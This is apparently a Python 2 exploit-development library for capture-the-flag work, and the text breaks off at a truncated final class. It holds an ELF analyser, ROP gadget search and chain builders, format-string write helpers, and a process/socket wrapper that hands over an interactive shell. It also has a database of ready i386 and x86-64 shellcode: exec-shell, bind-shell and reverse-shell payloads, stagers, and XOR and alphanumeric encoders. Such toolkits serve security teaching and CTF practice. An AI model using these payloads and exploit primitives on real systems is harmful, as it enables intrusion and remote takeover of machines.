#!/usr/bin/env python

import sys
import os
import re
import struct
import socket
import time
import fcntl
import select
import random
import signal
import tempfile
from telnetlib import Telnet
from subprocess import Popen, PIPE
from contextlib import contextmanager


def p32(x):
    if isinstance(x, str):
        return struct.unpack_from('<I', x)[0]
    else:
        return struct.pack('<I', x)

def p64(x):
    if isinstance(x, str):
        return struct.unpack_from('<Q', x)[0]
    else:
        return struct.pack('<Q', x)


class ELF:
    def __init__(self, fpath, base=0):
        self.fpath = fpath
        self.base = base
        self.sec = dict(relro=False, bind_now=False, stack_canary=False, nx=False, pie=False, rpath=False, runpath=False, dt_debug=False)

        if not os.path.exists(fpath):
            raise Exception("file not found: %r" % fpath)

        self._section = {}
        self._dynamic = {}
        self._got = {}
        self._plt = {}
        self._symbol = {}
        plt_index = 1

        p = Popen(['readelf', '-W', '-a', fpath], stdout=PIPE)
        line = ''
        while line != 'Section Headers:\n':  # read ELF Header
            line = p.stdout.readline()
            m = re.search(r'^\s*(?P<key>[^:]+):\s+(?P<value>.+)$', line)
            if not m:
                continue
            key, value = m.group('key'), m.group('value')
            if key == 'Class':
                if value == 'ELF64':
                    self.wordsize = 8
                elif value == 'ELF32':
                    self.wordsize = 4
                else:
                    raise Exception("unsupported ELF class: %s" % value)
            elif key == 'Type':
                if value == 'DYN (Shared object file)':
                    self.sec['pie'] = True
        while line != 'Program Headers:\n':  # read Section Headers
            line = p.stdout.readline()
            m = re.search(r'^\s*\[(?P<Nr>[^\]]+)\]\s+(?P<Name>\S+)\s+(?P<Type>\S+)\s+(?P<Address>\S+)\s+(?P<Off>\S+)\s+(?P<Size>\S+)\s+(?P<ES>\S+)\s+(?P<Flg>\S+)\s+(?P<Lk>\S+)\s+(?P<Inf>\S+)\s+(?P<Al>\S+)$', line)
            if not m or m.group('Nr') == 'Nr':
                continue
            name, address = m.group('Name'), int(m.group('Address'), 16)
            self._section[name] = address
        while not line.startswith('Dynamic section'):  # read Program Headers
            line = p.stdout.readline()
            m = re.search(r'^\s*(?P<Type>\S+)\s+(?P<Offset>\S+)\s+(?P<VirtAddr>\S+)\s+(?P<PhysAddr>\S+)\s+(?P<FileSiz>\S+)\s+(?P<MemSiz>\S+)\s+(?P<Flg>.{3})\s+(?P<Align>\S+)$', line)
            if not m or m.group('Type') == 'Type':
                continue
            type_, offset, virtaddr, filesiz, flg = m.group('Type'), int(m.group('Offset'), 16), int(m.group('VirtAddr'), 16), int(m.group('FileSiz'), 16), m.group('Flg')
            if type_ == 'GNU_RELRO':
                self.sec['relro'] = True
            elif type_ == 'GNU_STACK':
                if not 'E' in flg:
                    self.sec['nx'] = True
            elif type_ == 'LOAD':
                if 'E' in flg:
                    with open(fpath, 'rb') as f:
                        f.seek(offset)
                        blob = f.read(filesiz)
                    self.xmem = (virtaddr, blob)
        while not (line.startswith('Relocation section') and '.plt' in line):  # read Dynamic section
            line = p.stdout.readline()
            m = re.search(r'^\s*(?P<Tag>\S+)\s+\((?P<Type>[^)]+)\)\s+(?P<Value>.+)$', line)
            if not m or m.group('Tag') == 'Tag':
                continue
            type_, value = m.group('Type'), m.group('Value')
            if type_ == 'BIND_NOW':
                self.sec['bind_now'] = True
            elif type_ == 'RPATH':
                self.sec['rpath'] = True
            elif type_ == 'RUNPATH':
                self.sec['runpath'] = True
            elif type_ == 'DEBUG':
                self.sec['dt_debug'] = True
            if value.startswith('0x'):
                self._dynamic[type_] = int(value, 16)
            elif value.endswith(' (bytes)'):
                self._dynamic[type_] = int(value.split()[0])
        while not line.startswith('Symbol table'):  # read Relocation section (.rel.plt/.rela.plt)
            line = p.stdout.readline()
            m = re.search(r'^\s*(?P<Offset>\S+)\s+(?P<Info>\S+)\s+(?P<Type>\S+)\s+(?P<Value>\S+)\s+(?P<Name>\S+)(?: \+ (?P<AddEnd>\S+))?$', line)
            if not m or m.group('Offset') == 'Offset':
                continue
            offset, type_, name = int(m.group('Offset'), 16), m.group('Type'), m.group('Name')
            if not type_.endswith('JUMP_SLOT'):
                continue
            self._got[name] = offset
            self._plt[name] = self._section['.plt'] + 0x10*plt_index
            plt_index += 1
            if name == '__stack_chk_fail':
                self.sec['stack_canary'] = True
        while line and not line.startswith('Version symbols section'):  # read Symbol table
            line = p.stdout.readline()
            m = re.search(r'^\s*(?P<Num>[^:]+):\s+(?P<Value>\S+)\s+(?P<Size>\S+)\s+(?P<Type>\S+)\s+(?P<Bind>\S+)\s+(?P<Vis>\S+)\s+(?P<Ndx>\S+)\s+(?P<Name>\S+)', line)
            if not m or m.group('Num') == 'Num':
                continue
            if m.group('Ndx') == 'UND':
                continue
            name, value = m.group('Name'), int(m.group('Value'), 16)
            self._symbol[name] = value
            if '@@' in name:
                default_name = name.split('@@')[0]
                self._symbol[default_name] = value
        p.wait()

        self._string = {}
        p = Popen(['strings', '-tx', fpath], stdout=PIPE)
        for line in p.stdout:
            field = line.split()
            if len(field) != 2:
                continue
            name, addr = field[1], int(field[0], 16)
            self._string[name] = addr
        p.wait()

    def p(self, x):
        if self.wordsize == 8:
            return p64(x)
        else:
            return p32(x)

    def set_base(self, addr, name='__libc_start_main'):
        self.base = addr - self._symbol[name]

    def section(self, name):
        return self.base + self._section[name]

    def dynamic(self, name):
        return self.base + self._dynamic[name]

    def got(self, name=None):
        if name:
            return self.base + self._got[name]
        else:
            return self.dynamic('PLTGOT')

    def plt(self, name=None):
        if name:
            return self.base + self._plt[name]
        else:
            return self.base + self._section['.plt']

    def addr(self, name):
        return self.base + self._symbol[name]

    def str(self, name):
        return self.base + self._string[name]

    def gadget(self, keyword, reg=None, n=1):
        addr, blob = self.xmem
        addr += self.base

        regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']
        if reg:
            try:
                r = regs.index('r'+reg[1:])
            except ValueError:
                raise Exception("unexpected register: %r" % reg)
        else:
            r = regs.index('rsp')

        if keyword == 'pop':
            if reg:
                if r >= 8:
                    chunk = '\x41' + chr(0x58+(r-8)) + '\xc3'
                else:
                    chunk = chr(0x58+r) + '\xc3'
                return addr + blob.index(chunk)
            else:
                # skip rsp
                m = re.search(r"[\x58-\x5b\x5d-\x5f]{%d}\xc3" % n, blob)
                return addr + m.start()
        elif keyword == 'jmp':
            if r >= 8:
                chunk = '\x41\xff' + chr(0xe0+(r-8))
            else:
                chunk = '\xff' + chr(0xe0+r)
            return addr + blob.index(chunk)
        elif keyword == 'call':
            if r >= 8:
                chunk = '\x41\xff' + chr(0xd0+(r-8))
            else:
                chunk = '\xff' + chr(0xd0+r)
            return addr + blob.index(chunk)
        elif keyword == 'push':
            if r >= 8:
                chunk = '\x41' + chr(0x50+(r-8)) + '\xc3'
            else:
                chunk = chr(0x50+r) + '\xc3'
            return addr + blob.index(chunk)
        elif keyword == 'pivot':
            # TODO: support rax-rdi, r8-r15
            # xchg reg, esp
            if r == 0:
                if reg[0] == 'r':
                    return addr + blob.index('\x48\x94\xc3')
                else:
                    return addr + blob.index('\x94\xc3')
            else:
                if reg[0] == 'r':
                    if r >= 8:
                        chunk = '\x49\x87' + chr(0xe0+(r-8)) + '\xc3'
                    else:
                        chunk = '\x48\x87' + chr(0xe0+r) + '\xc3'
                else:
                    chunk = '\x87' + chr(0xe0+r) + '\xc3'
                try:
                    return addr + blob.index(chunk)
                except ValueError:
                    pass

                if reg[0] == 'r':
                    if r >= 8:
                        chunk = '\x4c\x87' + chr(0xc4+8*(r-8)) + '\xc3'
                    else:
                        chunk = '\x48\x87' + chr(0xc4+8*r) + '\xc3'
                else:
                    chunk = '\x87' + chr(0xc4+8*r) + '\xc3'
                return addr + blob.index(chunk)
        elif keyword == 'pushad':
            # x86 only
            return addr + blob.index('\x60\xc3')
        elif keyword == 'popad':
            # x86 only
            return addr + blob.index('\x61\xc3')
        elif keyword == 'leave':
            return addr + blob.index('\xc9\xc3')
        elif keyword == 'ret':
            return addr + blob.index('\xc3')
        elif keyword == 'int3':
            return addr + blob.index('\xcc')
        elif keyword == 'int0x80':
            return addr + blob.index('\xcd\x80')
        elif keyword == 'call_gs':
            return addr + blob.index('\x65\xff\x15\x10\x00\x00\x00')
        elif keyword == 'syscall':
            return addr + blob.index('\x0f\x05')
        else:
            # arbitary chunk
            return addr + blob.index(keyword)

    def checksec(self):
        ary = []

        if self.sec['relro']:
            if self.sec['bind_now']:
                ary.append('\033[32mFull RELRO   \033[m   ')
            else:
                ary.append('\033[33mPartial RELRO\033[m   ')
        else:
            ary.append('\033[31mNo RELRO     \033[m   ')

        if self.sec['stack_canary']:
            ary.append('\033[32mCanary found   \033[m   ')
        else:
            ary.append('\033[31mNo canary found\033[m   ')

        if self.sec['nx']:
            ary.append('\033[32mNX enabled \033[m   ')
        else:
            ary.append('\033[31mNX disabled\033[m   ')

        if self.sec['pie']:
            ary.append('\033[32mPIE enabled  \033[m   ')
        else:
            ary.append('\033[31mNo PIE       \033[m   ')

        if self.sec['rpath']:
            ary.append('\033[31mRPATH    \033[m  ')
        else:
            ary.append('\033[32mNo RPATH \033[m  ')

        if self.sec['runpath']:
            ary.append('\033[31mRUNPATH    \033[m  ')
        else:
            ary.append('\033[32mNo RUNPATH \033[m  ')

        ary.append(self.fpath)

        print "RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE"
        print ''.join(ary)

    def list_gadgets(self):
        regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

        print "%8s" % 'pop',
        for i in range(6):
            try:
                self.gadget('pop', n=i+1)
                print "\033[32m%d\033[m" % (i+1),
            except AttributeError:
                print "\033[31m%d\033[m" % (i+1),
        print

        for keyword in ['pop', 'jmp', 'call', 'push', 'pivot']:
            print "%8s" % keyword,
            for reg in regs:
                try:
                    self.gadget(keyword, reg)
                    print "\033[32m%s\033[m" % reg,
                except ValueError:
                    print "\033[31m%s\033[m" % reg,
            print

        print "%8s" % 'etc',
        for keyword in ['pushad', 'popad', 'leave', 'ret', 'int3', 'int0x80', 'call_gs', 'syscall']:
            try:
                self.gadget(keyword)
                print "\033[32m%s\033[m" % keyword,
            except ValueError:
                print "\033[31m%s\033[m" % keyword,
        print

    def scan_gadgets(self, chunk):
        i = 0
        while True:
            buf = self.xmem[1][i:]
            try:
                i += buf.index(chunk)
            except ValueError:
                break

            addr = self.xmem[0] + i
            p = Popen(['objdump', '-w', '-M', 'intel', '-D', '--start-address='+str(addr), self.fpath], stdout=PIPE)
            stdout, stderr = p.communicate()

            print
            for line in stdout.splitlines()[6:]:
                if not line:
                    break
                print line
                if '(bad)' in line:
                    break

            i += 1


class ROP(ELF):
    def call(self, addr, *args):
        if len(args) > 4:
            raise Exception("over 4 args is unsupported: %d" % len(args))

        if self.wordsize == 8:
            regs = ['rdi', 'rsi', 'rdx', 'rcx']
            buf = ''
            for i, arg in enumerate(args):
                buf += self.p(self.gadget('pop', regs[i]))
                buf += self.p(arg)
            buf += self.p(addr)
            return buf
        else:
            buf = self.p(addr)
            buf += self.p(self.gadget('pop', n=len(args)))
            for arg in args:
                buf += self.p(arg)
            return buf

    def call_plt(self, name, *args):
        return self.call(self.plt(name), *args)

    def call_chain_ptr(self, *calls, **kwargs):
        if self.wordsize != 8:
            raise Exception('support x86-64 only')

        gadget_candidates = [
            # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
            # Ubuntu clang version 3.0-6ubuntu3 (tags/RELEASE_30/final) (based on LLVM 3.0)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc (Ubuntu/Linaro 4.8.2-19ubuntu1) 4.8.2
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', True),
            # gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-4)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x72\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
        ]

        for chunk1, chunk2, _args_reversed in gadget_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_r12 = self.gadget(chunk1 + chunk2)
                args_reversed = _args_reversed
                break
            except ValueError:
                pass
        else:
            raise Exception('gadget not found')

        buf = p64(set_regs)

        for args in calls:
            if len(args) > 4:
                raise Exception('4th argument and latter should be set in advance')
            elif args[1] >= (1<<32):
                raise Exception("1st argument should be less than 2^32: %x" % args[1])

            ptr = args.pop(0)
            buf += self.junk()
            buf += p64(0) + p64(1) + p64(ptr)
            if not args_reversed:
                for arg in args:
                    buf += p64(arg)
                buf += self.junk(3-len(args))
            else:
                buf += self.junk(3-len(args))
                for arg in reversed(args):
                    buf += p64(arg)
            buf += p64(call_r12)

        buf += self.junk()
        if 'pivot' in kwargs:
            buf += p64(0)
            buf += p64(kwargs['pivot'] - self.wordsize)
            buf += p64(0) * 4
            buf += p64(self.gadget('leave'))
        else:
            buf += p64(0) * 6
        return buf

    def call_chain_plt(self, *calls, **kwargs):
        ary = []
        for call in calls:
            ary.append([self.got(call[0])] + call[1:])
        return self.call_chain_ptr(*ary, **kwargs)

    def dl_resolve(self, base, name, *args, **kwargs):
        def align(x, origin=0, size=0):
            pad = size - ((x-origin) % size)
            return (x+pad, pad)

        if self.wordsize == 8:
            jmprel = self.dynamic('JMPREL')
            relaent = self.dynamic('RELAENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            # prerequisite:
            # 1) overwrite (link_map + 0x1c8) with NULL
            # 2) set registers for arguments
            addr_reloc, pad_reloc = align(base + self.wordsize*3, jmprel, relaent)
            addr_sym, pad_sym = align(addr_reloc + 0x18, symtab, syment)
            addr_symstr = addr_sym + syment

            reloc_offset = (addr_reloc - jmprel) / relaent
            r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
            st_name = addr_symstr - strtab

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            if 'retaddr' in kwargs:
                buf += self.p(kwargs['retaddr'])
            else:
                buf += self.junk()
            buf += self.fill(pad_reloc)
            buf += struct.pack('<QQQ', self.section('.bss'), r_info, 0)  # Elf64_Rela
            buf += self.fill(pad_sym)
            buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
            buf += self.string(name)
        else:
            jmprel = self.dynamic('JMPREL')
            relent = self.dynamic('RELENT')
            symtab = self.dynamic('SYMTAB')
            syment = self.dynamic('SYMENT')
            strtab = self.dynamic('STRTAB')

            addr_reloc = base + self.wordsize*(3+len(args))
            addr_sym, pad_sym = align(addr_reloc+relent, symtab, syment)
            addr_symstr = addr_sym + syment

            reloc_offset = addr_reloc - jmprel
            r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
            st_name = addr_symstr - strtab

            buf = self.p(self.plt())
            buf += self.p(reloc_offset)
            if 'retaddr' in kwargs:
                buf += self.p(kwargs['retaddr'])
            else:
                buf += self.junk()
            for arg in args:
                buf += self.p(arg)
            buf += struct.pack('<II', self.section('.bss'), r_info)  # Elf32_Rel
            buf += self.fill(pad_sym)
            buf += struct.pack('<IIII', st_name, 0, 0, 0x12)         # Elf32_Sym
            buf += self.string(name)

        return buf

    def syscall(self, number, *args):
        if self.wordsize == 8:
            arg_regs = ['rdi', 'rsi', 'rdx', 'r10', 'r8', 'r9']
            buf = self.p(self.gadget('pop', 'rax')) + self.p(number)
            for arg_reg, arg in zip(arg_regs, args):
                buf += self.p(self.gadget('pop', arg_reg)) + self.p(arg)
            buf += self.p(self.gadget('syscall'))
        else:
            try:
                # popad = pop edi, esi, ebp, esp, ebx, edx, ecx, eax
                args = list(args) + [0] * (6-len(args))
                buf = self.p(self.gadget('popad')) + struct.pack('<IIIIIIII', args[4], args[3], args[5], 0, args[0], args[2], args[1], number)
            except ValueError:
                arg_regs = ['ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp']
                buf = self.p(self.gadget('pop', 'eax')) + self.p(number)
                for arg_reg, arg in zip(arg_regs, args):
                    buf += self.p(self.gadget('pop', arg_reg)) + self.p(arg)
            buf += self.p(self.gadget('int0x80'))
        return buf

    def pivot(self, rsp):
        buf = self.p(self.gadget('pop', 'rbp'))
        buf += self.p(rsp - self.wordsize)
        buf += self.p(self.gadget('leave'))
        return buf

    def string(self, s):
        return s + '\x00'

    def junk(self, n=1):
        return self.fill(self.wordsize * n)

    def fill(self, size, buf=''):
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        buflen = size - len(buf)
        return ''.join(random.choice(chars) for i in xrange(buflen))

    def retfill(self, size, buf=''):
        buflen = size - len(buf)
        s = self.fill(buflen % self.wordsize)
        s += self.p(self.gadget('ret')) * (buflen // self.wordsize)
        return s

    def derive(self, blob, base=0):
        return ROPBlob(blob, self.wordsize, base)


class ROPBlob(ROP):
    def __init__(self, blob, wordsize, base=0):
        self.xmem = (0, blob)
        self.wordsize = wordsize
        self.base = base


class Shellcode:
    _database = {
        'i386': {
            '_noppairs': ['AI', 'BJ', 'CK', 'FN', 'GO'],
            'exec_shell': "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80",
            'read_stager': "\xeb\x10\x59\x31\xdb\x8d\x53\x01\xc1\xe2\x0c\x8d\x43\x03\xcd\x80\xeb\x05\xe8\xeb\xff\xff\xff",
            'mmap_stager': "\x31\xc9\x8d\x51\x01\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\x8d\x41\x5a\xcd\x80\x89\xcb\x89\xc1\x8d\x43\x03\xcd\x80\xff\xe1",
            '_cat': "\xeb\x23\x58\x31\xd2\x8d\x48\x01\x89\xce\x02\x08\x88\x11\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x53\x89\xe1\x8d\x42\x0b\xcd\x80\xe8\xd8\xff\xff\xff",
            '_dup': "\x31\xd2\x8d\x5a${fd}\x8d\x4a\x02\x8d\x42\x3f\xcd\x80\x49\x79\xf8",
            '_bind_shell': "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00${port}\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
            '_reverse_shell': "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68${host}\x68\x02\x00${port}\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",
            '_xor_decoder': "\xeb\x09\x59\x80\x31${key}\x74\x08\x41\xeb\xf8\xe8\xf2\xff\xff\xff",
        },
        'x86-64': {
            '_noppairs': ['PX', 'QY', 'RZ'],
            'exec_shell': "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05",
            'read_stager': "\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xeb\x05\xe8\xe8\xff\xff\xff",
            'mmap_stager': "\x4d\x31\xc9\x4d\x8d\x41\xff\x4d\x8d\x51\x22\x49\x8d\x51\x07\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x4c\x89\xcf\x49\x8d\x41\x09\x0f\x05\x48\x89\xf2\x48\x89\xc6\x4c\x89\xc8\x0f\x05\xff\xe6",
            '_cat': "\xeb\x2a\x58\x48\x31\xd2\x48\x8d\x48\x01\x48\x89\xce\x02\x08\x88\x11\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x63\x61\x74\x50\x48\x89\xe7\x52\x56\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05\xe8\xd1\xff\xff\xff",
            '_dup': "\x48\x31\xd2\x48\x8d\x7a${fd}\x48\x8d\x72\x02\x48\x8d\x42\x21\x0f\x05\x48\xff\xce\x79\xf5",
            '_bind_shell': "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\xc7\x04\x24\x02\x00${port}\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05",
            '_reverse_shell': "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00${port}${host}\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05",
            '_xor_decoder': "\xeb\x0b\x59\x80\x31${key}\x74\x0a\x48\xff\xc1\xeb\xf6\xe8\xf0\xff\xff\xff",
        }
    }

    def __init__(self, arch):
        if arch not in self._database:
            raise Exception("unsupported architechture: %r" % arch)
        self.arch = arch

    def get(self, name):
        if name not in self._database[self.arch]:
            raise Exception("unsupported shellcode for this architechture: %r" % name)
        return self._database[self.arch][name]

    def nopfill(self, name, size, buf=''):
        code = self.get(name)
        noplen = size - len(buf) - len(code)
        buf = bytearray()
        while len(buf) < noplen:
            buf += random.choice(self.get('_noppairs'))
        return str(buf[:noplen] + code)

    def cat(self, fpath):
        return self.get('_cat') + chr(len(fpath)) + fpath

    def dup(self, name, fd):
        if fd > 0x7f:
            raise Exception("fd over 0x7f is unsupported: %d" % fd)

        return self.get('_dup').replace('${fd}', chr(fd)) + self.get(name)

    def bind_shell(self, port):
        p = struct.pack('>H', port)
        return self.get('_bind_shell').replace('${port}', p)

    def reverse_shell(self, host, port):
        addrinfo = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
        h, p = addrinfo[0][4]
        h = socket.inet_aton(h)
        p = struct.pack('>H', p)
        return self.get('_reverse_shell').replace('${host}', h).replace('${port}', p)

    def xor(self, name, key=0xff):
        decoder = self.get('_xor_decoder').replace('${key}', chr(key))
        return decoder + ''.join(chr(ord(x)^key) for x in self.get(name)) + chr(key)

    def alnum(self, name, reg=None):
        if self.arch != 'i386':
            raise Exception("unsupported architechture: %r" % self.arch)

        chars = range(0x30,0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b)
        pairs = [(y, z) for y in chars for z in chars]
        regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

        data = '\xf0' + self.get(name) + '\x00'
        encoded = [0x30]

        for i, c in enumerate(data):
            original_byte = ord(c)
            x = encoded[i]
            for y, z in pairs:
                if (x^(y*0x30)^z) & 0xFF == original_byte:
                    encoded += [y, z]
                    break
            else:
                raise Exception("something wrong: %02x" % original_byte)

        if reg:
            try:
                r = regs.index(reg.lower())
            except ValueError:
                raise Exception("unsupported register: %s" % reg)

            # push reg; pop ecx
            buf = chr(0x50+r) + 'Y'
        else:
            # set ecx by using call
            buf = '\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xffYF'

        buf += 'h3333k4dsFkDqG02DqH0D10u' + str(bytearray(encoded))
        return buf


class FormatStr:
    def __init__(self, offset=0):
        # x86 only
        self.offset = offset

    def dump_stack(self, size, start=None):
        buf = 'AAAA'
        if start > 1:
            i = start
            while len(buf) < size:
                buf += ".%%%d$08x" % i
                i += 1
        else:
            while len(buf) < size:
                buf += '.%08x'
        return buf[:size]

    def calc_offset(self, s):
        return s.split('.').index('41414141')

    def gets(self, addr):
        buf = struct.pack('<I', addr)
        buf += "%%%d$s" % self.offset
        return buf

    def write4(self, addr, value):
        buf = struct.pack('<II', addr, addr+2)

        n = [(value & 0xFFFF), ((value>>16) & 0xFFFF)]
        n[1] = ((n[1]-n[0]-1) % 0x10000) + 1
        n[0] = ((n[0]-len(buf)-1) % 0x10000) + 1

        buf += "%%%dc%%%d$hn" % (n[0], self.offset)
        buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)

        return buf


class Proc:
    def __init__(self, *args, **kwargs):
        if kwargs.get('debug'):
            os.kill(os.getpid(), signal.SIGTRAP)

        self.write_interval = kwargs.get('write_interval', 0.1)
        self.read_timeout = kwargs.get('read_timeout', 0.5)
        self.display = kwargs.get('display', False)

        if 'host' in kwargs and 'port' in kwargs:
            self.p = socket.create_connection((kwargs['host'], kwargs['port']))
            self.p.setblocking(0)
        else:
            self.p = Popen(args, stdin=PIPE, stdout=PIPE)
            fd = self.p.stdout.fileno()
            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

    def setdisplay(self, x):
        self.display = bool(x)

    def write(self, s, interval=None):
        if interval is None:
            interval = self.write_interval

        time.sleep(interval)

        if self.display:
            printable = re.sub(r'[^\s\x20-\x7e]', '.', s)
            sys.stdout.write("\x1b[33m%s\x1b[0m" % printable)  # yellow
            sys.stdout.flush()

        if isinstance(self.p, Popen):
            select.select([], [self.p.stdin], [])
            return self.p.stdin.write(s)
        else:
            select.select([], [self.p], [])
            return self.p.sendall(s)

    def read(self, size=-1, timeout=None):
        if size < 0:
            return self.readall(timeout=timeout)

        if timeout is None:
            timeout = self.read_timeout

        buf = ''
        if isinstance(self.p, Popen):
            while len(buf) < size:
                rlist, wlist, xlist = select.select([self.p.stdout], [], [], timeout)
                if rlist:
                    chunk = self.p.stdout.read(size-len(buf))
                    if not chunk:
                        break
                    buf += chunk
                else:
                    break
        else:
            while len(buf) < size:
                rlist, wlist, xlist = select.select([self.p], [], [], timeout)
                if rlist:
                    chunk = self.p.recv(size-len(buf))
                    if not chunk:
                        break
                    buf += chunk
                else:
                    break

        if self.display:
            printable = re.sub(r'[^\s\x20-\x7e]', '.', buf)
            sys.stdout.write("\x1b[36m%s\x1b[0m" % printable)  # cyan
            sys.stdout.flush()

        return buf

    def readall(self, chunk_size=8192, timeout=None):
        buf = ''
        while True:
            chunk = self.read(chunk_size, timeout)
            buf += chunk
            if len(chunk) < chunk_size:
                break
        return buf

    def interact(self, shell=True):
        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green

        self.setdisplay(False)

        buf = self.read()
        sys.stdout.write(buf)

        if isinstance(self.p, Popen):
            if shell:
                self.write(check_cmd + '\n')
                sys.stdout.write(self.read())
                self.write('exec /bin/sh <&2 >&2\n')
            self.p.wait()
        else:
            if shell:
                self.write('exec /bin/sh >&0 2>&0\n')
                self.write(check_cmd + '\n')
            t = Telnet()
            t.sock = self.p
            t.interact()
            t.close()

    @contextmanager
    def listen(self, port=4444):
        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', port))  # the empty string represents INADDR_ANY
        s.listen(1)

        if isinstance(self.p, Popen):
            addrinfo = socket.getaddrinfo('localhost', port, socket.AF_INET, socket.SOCK_STREAM)
            host = addrinfo[0][4][0]
        else:
            host = self.p.getsockname()[0]
        yield (host, port)

        c, addr = s.accept()
        s.close()
        c.sendall(check_cmd + '\n')
        sys.stdout.write(c.recv(8192))

        t = Telnet()
        t.sock = c
        t.interact()
        t.close()
        self.close()

    def close(self):
        if isinstance(self.p, Popen):
            self.p.terminate()
            self.p.wait()
        else:
            self.p.close()

    def strings(self, n=4):
        if isinstance(self.p, Popen):
            p_stdout = self.p.stdout
        else:
            p_stdout = self.p.makefile()
        p = Popen(['strings', '-tx', '-n', str(n)], stdin=p_stdout, stdout=PIPE)
        stdout, stderr = p.communicate()
        return stdout.rstrip()

    def write_p64(self, s, interval=None):
        return self.write(p64(s), interval)

    def write_p32(self, s, interval=None):
        return self.write(p32(s), interval)

    def read_p64(self, timeout=None):
        return p64(self.read(8, timeout))

    def read_p32(self, timeout=None):
        return p32(self.read(4, timeout))


class Pattern:
    @classmethod
